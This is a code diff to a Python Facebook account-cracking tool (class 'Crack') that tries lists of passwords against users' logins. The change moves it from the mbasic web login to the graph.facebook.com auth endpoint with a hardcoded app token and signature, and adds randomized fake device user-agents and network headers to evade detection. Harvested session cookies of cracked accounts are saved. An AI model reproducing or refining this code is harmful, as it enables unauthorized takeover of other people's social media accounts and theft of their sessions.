@@ -411,33 +411,28 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				r = ses.get("https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl")
+				#ua = random.choice(["Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]","Dalvik/2.1.0 (Linux; U; Android 5.1.1; F1 Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/Oppo;FBBD/Oppo;FBDV/F1;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]","Dalvik/2.1.0 (Linux; U; Android 9; INE-LX1r Build/HUAWEIINE-LX1r) [FBAN/Orca-Android;FBAV/212.1.0.13.109;FBPN/com.facebook.orca;FBLC/en_US;FBBV/151534286;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2128};FB_FW/1;]"])
 				params = {
-					'lsd': re.search('name="lsd" value="(.*?)"',str(r.text)).group(1), 
-                 'jazoest': re.search('name="jazoest" value="(.*?)"',str(r.text)).group(1),
-                 'm_ts': re.search('name="m_ts" value="(.*?)"',str(r.text)).group(1), 
-                 'li': re.search('name="li" value="(.*?)"',str(r.text)).group(1), 
-                 'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'masked_cp': '', 'pass': pw,'login': 'Masuk', 'bi_xrwh': '0'}
+					"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
+					"sdk_version": {random.randint(1,26)}, 
+					"email": user,
+					"locale": "en_US",
+					"password": pw,
+					"sdk": "android",
+					"generate_session_cookies": "1",
+					"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
+				}
 				headers = {
-					"Host": "mbasic.facebook.com",
-                "content-length": "200",
-                "cache-control": "max-age=0",
-                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "upgrade-insecure-requests": '"1"',
-                "origin": "https://mbasic.facebook.com",
-                "content-type": "application/x-www-form-urlencoded",
-                "user-agent": ua,
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "navigate",
-                "sec-fetch-user": "?1",
-                "sec-fetch-dest": "document",
-				"referer": "https://mbasic.facebook.com/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl",
-				"accept-encoding": "gzip, deflate, br",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-				post = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&refsrc=deprecated&lwv=101&ref=dbl",params=params, headers=headers, allow_redirects=False)
+					"Host": "graph.facebook.com",
+					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
+					"x-fb-sim-hni": str(random.randint(20000, 40000)),
+					"x-fb-net-hni": str(random.randint(20000, 40000)),
+					"x-fb-connection-quality": "EXCELLENT",
+					"user-agent": Session().generate_ugent(),
+					"content-type": "application/x-www-form-urlencoded",
+					"x-fb-http-engine": "Liger"
+				}
+				post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					self.ok.append(user)
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
@@ -586,8 +581,10 @@ class Session:
 		versi_android = random.randint(4,12)
 		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
 		versi_app = random.randint(410000000,499999999)
-		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; 21061119DG Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{versi_app};FBCR/3;FBMF/xiaomi;FBBD/xiaomi;FBDV/21061119DG;FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]"
-		return ugent
+		device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09"])
+		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
+		ugent = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"
+		return ugent		
 		
 if __name__=="__main__":
 	try:os.mkdir("OK")
